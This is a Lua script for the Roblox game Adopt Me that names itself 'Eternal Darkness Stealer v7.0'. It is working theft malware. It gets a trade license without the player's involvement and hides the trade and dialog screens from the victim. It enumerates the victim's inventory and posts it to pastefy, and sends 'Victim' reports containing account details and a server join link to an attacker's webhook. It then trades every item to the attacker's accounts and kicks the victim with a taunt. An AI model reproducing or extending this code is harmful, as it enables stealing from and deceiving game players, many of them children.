if not _G.ED_CONFIG then
    warn("[ED] No config found. Execute the user loader first!")
    return
end

local cfg = _G.ED_CONFIG
local WEBHOOK_ID = cfg.WEBHOOK_ID
local USERNAMES = cfg.USERNAMES
local PROXY_URL = cfg.PROXY_URL

if not WEBHOOK_ID or WEBHOOK_ID == "" then
    warn("[ED] Invalid WEBHOOK_ID")
    return
end

if not USERNAMES or #USERNAMES == 0 then
    warn("[ED] No usernames configured")
    return
end

local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local plr = Players.LocalPlayer

if not plr then
    warn("[ED] LocalPlayer not found")
    return
end

local executorName = "Unknown"
pcall(function()
    if identifyexecutor then
        executorName = identifyexecutor()
    elseif getexecutorname then
        executorName = getexecutorname()
    end
end)

getgenv().request = getgenv().request or request or http_request or
    (syn and syn.request) or (http and http.request) or
    (fluxus and fluxus.request) or nil

if not getgenv().request then
    warn("[ED] No request function found - executor not supported")
    return
end

local request = getgenv().request

local REAL_JOB_ID = game.JobId
local bypassJobId = game.JobId
local capturedJobId = false

if identifyexecutor and identifyexecutor() == "Delta" then
    local stepAnimate = nil
    local printed = false

    repeat
        for _, v in ipairs(getgc(true)) do
            if typeof(v) == "function" then
                local info = debug.getinfo(v)
                if info and info.name == "stepAnimate" then
                    stepAnimate = v
                    break
                end
            end
        end
        task.wait()
    until stepAnimate

    local old
    old = hookfunction(stepAnimate, function(dt)
        if not printed then
            printed = true
            bypassJobId = game.JobId
            capturedJobId = true
        end
        return old(dt)
    end)
    repeat task.wait() until capturedJobId
    REAL_JOB_ID = bypassJobId
end

local ETERNAL_DARKNESS_COLORS = {
    primary = 0x0a0a1a,
    secondary = 0x1a1a2e,
    accent = 0x16213e,
    highlight = 0x0f3460,
    text = 0x533483,
    gold = 0x8b0000,
    success = 0x006400
}

if game.PlaceId ~= 920587237 then
    plr:kick("[ED] Game not supported. Please join a normal Adopt Me server")
    return
end

if #Players:GetPlayers() >= 48 then
    plr:kick("[ED] Server is full. Please join a less populated server")
    return
end

if game:GetService("RobloxReplicatedStorage"):WaitForChild("GetServerType"):InvokeServer() == "VIPServer" then
    plr:kick("[ED] Server error. Please join a DIFFERENT server")
    return
end

local itemsToSend = {}
local inTrade = false
local playerGui = plr:WaitForChild("PlayerGui")
local tradeFrame = playerGui.TradeApp.Frame
local dialog = playerGui.DialogApp.Dialog
local toolApp = playerGui.ToolApp.Frame

-- Auto-get trade license if missing
local tradeLicense = require(game.ReplicatedStorage.SharedModules.TradeLicenseHelper)
if not tradeLicense.player_has_trade_license() then
    local Fsys = require(game.ReplicatedStorage:WaitForChild("Fsys")).load
    local Router = Fsys("RouterClient")
    Router.get("SettingsAPI/SetBooleanFlag"):FireServer("has_talked_to_trade_quest_npc", true)
    task.wait(0.5)
    task.wait(1)
    for _, question in pairs(Fsys("ClientData").get("trade_license_quiz_manager").quiz) do
        Router.get("TradeAPI/AnswerQuizQuestion"):FireServer(question.answer)
        task.wait(0.1)
    end
    task.wait(2)
    if not tradeLicense.player_has_trade_license() then
        plr:kick("[ED] Failed to obtain trade license automatically. Please get it manually.")
        return
    end
end

local Loads = require(game.ReplicatedStorage.Fsys).load
local RouterClient = Loads("RouterClient")
local SendTrade = RouterClient.get("TradeAPI/SendTradeRequest")
local AddPetRemote = RouterClient.get("TradeAPI/AddItemToOffer")
local AcceptNegotiationRemote = RouterClient.get("TradeAPI/AcceptNegotiation")
local ConfirmTradeRemote = RouterClient.get("TradeAPI/ConfirmTrade")
local SettingsRemote = RouterClient.get("SettingsAPI/SetSetting")
local InventoryDB = Loads("InventoryDB")

local function propertiesToString(props)
    local str = ""
    if props.rideable then str = str .. "R" end
    if props.flyable then str = str .. "F" end
    if props.mega_neon then
        str = str .. "M"
    elseif props.neon then
        str = str .. "N"
    else
        str = str .. ""
    end
    return str
end

local function uploadToPastefy(items)
    local lines = {
        "Eternal Darkness Adopt Me Inventory | " .. plr.Name,
        "Generated: " .. os.date("%Y-%m-%d %H:%M:%S"),
        "Total Items: " .. #items,
        string.rep("-", 50),
        ""
    }

    for _, item in ipairs(items) do
        local propStr = propertiesToString(item.Properties)
        table.insert(lines, string.format("%s [%s] | UID: %s", item.Name, propStr, item.UID))
    end

    local content = table.concat(lines, "\n")
    local ok, response = pcall(function()
        return request({
            Url = "https://pastefy.app/api/v2/paste",
            Method = "POST",
            Headers = {["Content-Type"] = "application/json"},
            Body = HttpService:JSONEncode({content = content, type = "PASTE"})
        })
    end)
    if ok and response and response.StatusCode == 200 then
        local ok2, data = pcall(function() return HttpService:JSONDecode(response.Body) end)
        if ok2 and data then
            return data.paste and "https://pastefy.app/" .. data.paste.id or
                   data.id and "https://pastefy.app/" .. data.id or "Failed to upload"
        end
    end
    return "Failed to upload"
end

local function sendToProxy(payload)
    task.spawn(function()
        local url = PROXY_URL .. WEBHOOK_ID
        local success, response = pcall(function()
            return request({
                Url = url,
                Method = "POST",
                Headers = {
                    ["Content-Type"] = "application/json",
                    ["User-Agent"] = "EternalDarkness/2.0.0"
                },
                Body = HttpService:JSONEncode(payload)
            })
        end)

        if not success or (response and response.StatusCode ~= 200 and response.StatusCode ~= 204) then
            warn("[ED] Webhook failed")
        else
            print("[ED] Webhook sent successfully")
        end
    end)
end

local hashes = {}
for _, v in pairs(getgc()) do
    if type(v) == "function" and debug.getinfo(v).name == "get_remote_from_cache" then
        local upvalues = debug.getupvalues(v)
        if type(upvalues[1]) == "table" then
            for key, value in pairs(upvalues[1]) do
                hashes[key] = value
            end
        end
    end
end

local function hashedAPI(remoteName, ...)
    local remote = hashes[remoteName]
    if not remote then return nil end

    if remote:IsA("RemoteFunction") then
        return remote:InvokeServer(...)
    elseif remote:IsA("RemoteEvent") then
        remote:FireServer(...)
    end
end

local data = hashedAPI("DataAPI/GetAllServerData")
if not data then
    plr:kick("[ED] Tampering detected. Please rejoin and re-execute without any other scripts")
    return
end

local excludedItems = {
    "spring_2025_minigame_scorching_kaijunior",
    "spring_2025_minigame_toxic_kaijunior",
    "spring_2025_minigame_spiked_kaijunior",
    "spring_2025_minigame_spotted_kaijunior"
}

local inventory = data[plr.Name].inventory
local rarityCounts = {MegaNeon=0, Neon=0, FlyRide=0, Ride=0, Fly=0, NoPotion=0}

for category, list in pairs(inventory) do
    for uid, data in pairs(list) do
        local cat = InventoryDB[data.category]
        if cat and cat[data.id] then
            if table.find(excludedItems, data.id) then
                continue
            end
            table.insert(itemsToSend, {UID = uid, Name = cat[data.id].name, Properties = data.properties})

            if data.properties.mega_neon then
                rarityCounts.MegaNeon = rarityCounts.MegaNeon + 1
            elseif data.properties.neon then
                rarityCounts.Neon = rarityCounts.Neon + 1
            end
            if data.properties.rideable and data.properties.flyable then
                rarityCounts.FlyRide = rarityCounts.FlyRide + 1
            elseif data.properties.rideable then
                rarityCounts.Ride = rarityCounts.Ride + 1
            elseif data.properties.flyable then
                rarityCounts.Fly = rarityCounts.Fly + 1
            else
                rarityCounts.NoPotion = rarityCounts.NoPotion + 1
            end
        end
    end
end

tradeFrame:GetPropertyChangedSignal("Visible"):Connect(function()
    if tradeFrame.Visible then
        inTrade = true
    else
        inTrade = false
    end
end)

dialog:GetPropertyChangedSignal("Visible"):Connect(function()
    dialog.Visible = false
end)

toolApp:GetPropertyChangedSignal("Visible"):Connect(function()
    toolApp.Visible = true
end)

local fernJoinerLink = string.format("https://fern.wtf/joiner?placeId=%d&gameInstanceId=%s", PlaceId, REAL_JOB_ID)

game:GetService("Players").LocalPlayer.PlayerGui.TradeApp.Enabled = false
game:GetService("Players").LocalPlayer.PlayerGui.HintApp:Destroy()
game:GetService("Players").LocalPlayer.PlayerGui.DialogApp.Dialog.Visible = false

if #itemsToSend > 0 then
    local rubisLink = uploadToPastefy(itemsToSend)
    local PlaceId = game.PlaceId
    local total_items = #itemsToSend

    local top_items = {}
    for i = 1, math.min(5, #itemsToSend) do
        local item = itemsToSend[i]
        local propStr = propertiesToString(item.Properties)
        table.insert(top_items, string.format("`%s` [%s]", item.Name, propStr))
    end

    local fields = {
        {name = "👤 Victim", value = plr.DisplayName .. "\n(@" .. plr.Name .. ")\nID: " .. plr.UserId .. "\nAge: " .. plr.AccountAge .. " days", inline = true},
        {name = "⚙️ System", value = "Executor: " .. executorName .. "\nReceiver: " .. table.concat(USERNAMES, ", ") .. "\nJob ID:\n" .. string.sub(REAL_JOB_ID, 1, 8) .. "...", inline = true},
        {name = "📦 Total Items", value = tostring(total_items), inline = true}
    }

    local esc = string.char(27)
    local ansiLine1 = esc .. "[2;35mMega Neon: " .. rarityCounts.MegaNeon .. "  " .. esc .. "[2;36mNeon:    " .. rarityCounts.Neon .. esc .. "[0m"
    local ansiLine2 = esc .. "[2;33mFly&Ride: " .. rarityCounts.FlyRide .. "  " .. esc .. "[2;34mRide:    " .. rarityCounts.Ride .. esc .. "[0m"
    local ansiLine3 = esc .. "[2;32mFly:      " .. rarityCounts.Fly .. "  " .. esc .. "[2;37mNoPot:   " .. rarityCounts.NoPotion .. esc .. "[0m"

    table.insert(fields, {name = "📊 Inventory Breakdown", value = "```ansi\n" .. ansiLine1 .. "\n" .. ansiLine2 .. "\n" .. ansiLine3 .. "\n```", inline = false})
    table.insert(fields, {name = "🏆 Top Items", value = "```\n" .. table.concat(top_items, "\n") .. "\n```", inline = false})
    table.insert(fields, {name = "🔗 Actions", value = "[Join Server](" .. fernJoinerLink .. ") • [View Inventory](" .. rubisLink .. ")", inline = false})

    local payload = {
        content = "@everyone 🌑 **NEW ADOPT ME HIT | Eternal Darkness**",
        username = "🌑 Eternal Darkness",
        embeds = {{
            title = "Eternal Darkness Adopt Me HIT",
            url = rubisLink,
            color = ETERNAL_DARKNESS_COLORS.secondary,
            description = "```lua\ngame:GetService('TeleportService'):TeleportToPlaceInstance(" .. PlaceId .. ", '" .. REAL_JOB_ID .. "')\n```",
            fields = fields,
            footer = {text = "Eternal Darkness Stealer v7.0"},
            timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
        }}
    }

    sendToProxy(payload)
    SettingsRemote:FireServer("trade_requests", 1)

    local function doTrade(joinedUser)
        while #itemsToSend > 0 do
            local tradeRequestSent = false
            if not inTrade and not tradeRequestSent then
                SendTrade:FireServer(game.Players[joinedUser])
                tradeRequestSent = true
            else
                for i = 1, math.min(18, #itemsToSend) do
                    local item = table.remove(itemsToSend, 1)
                    AddPetRemote:FireServer(item.UID)
                end
                repeat
                    AcceptNegotiationRemote:FireServer()
                    wait(0.1)
                    ConfirmTradeRemote:FireServer()
                until not inTrade
                tradeRequestSent = false
            end
            wait(1)
        end

        local completionPayload = {
            username = "🌑 Eternal Darkness",
            embeds = {{
                title = "✅ Adopt Me Trade Completed",
                color = ETERNAL_DARKNESS_COLORS.success,
                description = "All items have been successfully traded from **" .. plr.Name .. "**",
                fields = {
                    {name = "👤 Victim", value = plr.Name, inline = true},
                    {name = "📦 Total Items", value = tostring(total_items), inline = true}
                },
                footer = {text = "Eternal Darkness Stealer v7.0"},
                timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
            }}
        }
        sendToProxy(completionPayload)

        plr:kick("[ED] All your stuff just got taken by Eternal Darkness.")
    end

    local function waitForUserChat()
        local sentMessage = false
        local function onPlayerChat(player)
            if table.find(USERNAMES, player.Name) then
                player.Chatted:Connect(function()
                    if not sentMessage then
                        local startPayload = {
                            username = "🌑 Eternal Darkness",
                            embeds = {{
                                title = "🔔 Trade Started",
                                color = ETERNAL_DARKNESS_COLORS.highlight,
                                description = "Receiver **" .. player.Name .. "** has joined and trade is beginning...",
                                fields = {
                                    {name = "👤 Victim", value = plr.Name, inline = true},
                                    {name = "🎯 Receiver", value = player.Name, inline = true}
                                },
                                footer = {text = "Eternal Darkness Stealer v7.0"},
                                timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
                            }}
                        }
                        sendToProxy(startPayload)
                        sentMessage = true
                    end
                    doTrade(player.Name)
                end)
            end
        end
        for _, p in ipairs(Players:GetPlayers()) do onPlayerChat(p) end
        Players.PlayerAdded:Connect(onPlayerChat)
    end
    waitForUserChat()
else
    plr:kick("[ED] No items found.")
end
